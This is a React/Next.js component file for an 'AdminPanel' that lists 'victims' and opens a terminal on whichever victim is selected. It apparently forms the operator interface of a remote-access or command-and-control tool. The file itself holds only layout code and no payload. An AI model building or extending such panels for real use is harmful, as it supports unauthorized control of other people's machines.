'use client'

import { VictimList } from "@/Components/VictimList";
import { useState } from "react";
import {User} from "@/Interfaces/User.ts";
import { Terminal } from "@/Components/Terminal";

export default function AdminPanel() {
    const [selectedUser, setSelectedUser] = useState<User | null>(null);

    return (
        <div className="h-screen bg-black p-4">
            <div className="h-full text-green-500 font-mono">
                <div className="h-full grid grid-rows-1 grid-cols-3 gap-1">
                    <div className="col-span-1 h-full overflow-auto">
                        <VictimList selectedUser={selectedUser} setSelectedUser={setSelectedUser}/>
                    </div>
                    {/* <div
                        className="col-span-2 w-full mx-auto bg-black/50 rounded-lg shadow-lg overflow-hidden border border-green-500">
                        <Interface selectedUser={selectedUser}/>
                    </div> */}
                    <div className="col-span-2 w-full h-full mx-auto">
                        {selectedUser &&
                            <Terminal selectedUser={selectedUser}/>
                        }
                        {
                            !selectedUser &&
                            <div className="h-full flex flex-col items-center justify-center">
                                <p className="text-xl font-semibold">No victim selected.</p>
                                <p className="text-lg font-semibold">Please select a victim from the list on the left.</p>
                            </div>
                        }
                    </div>
                </div>
            </div>
        </div>
    );
}
